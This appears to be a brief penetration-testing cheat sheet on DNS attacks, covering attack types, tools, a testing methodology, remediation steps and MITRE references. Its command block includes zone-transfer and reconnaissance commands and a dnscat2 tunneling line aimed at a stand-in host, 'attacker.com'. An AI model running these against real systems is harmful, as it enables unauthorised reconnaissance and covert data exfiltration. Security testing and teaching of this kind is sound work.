# DNS Attacks

Exploiting DNS infrastructure vulnerabilities to redirect, intercept, or disrupt name resolution.

## Attack Types
- **DNS Spoofing/Poisoning**: False responses
- **Cache Poisoning**: Corrupt resolver cache
- **DNS Tunneling**: Data exfiltration via queries
- **DNS Amplification**: DDoS reflection
- **Zone Transfer**: Unauthorized AXFR

## Tools
- dnsspoof, Bettercap, dnscat2, fierce, dnsrecon, dig

## Quick Commands
```bash
# Zone transfer attempt
dig @dns-server.com domain.com AXFR

# DNS reconnaissance
dnsrecon -d domain.com -t axfr
fierce --domain domain.com

# DNSSEC validation
dig @resolver domain.com +dnssec

# DNS tunneling
dnscat2 --dns server=attacker.com
```

## Methodology
1. Identify DNS servers
2. Test zone transfers (AXFR)
3. Cache poisoning attempts
4. Test DNS recursion
5. Subdomain enumeration
6. DNS tunneling capability tests

## Remediation
- Implement DNSSEC
- Restrict zone transfers
- Disable recursion on authoritative servers
- Rate limiting
- Monitor for anomalies

**MITRE**: T1071.004, T1048.003 | **CWE**: CWE-350 | **CVE**: CVE-2020-1350 (SIGRed)
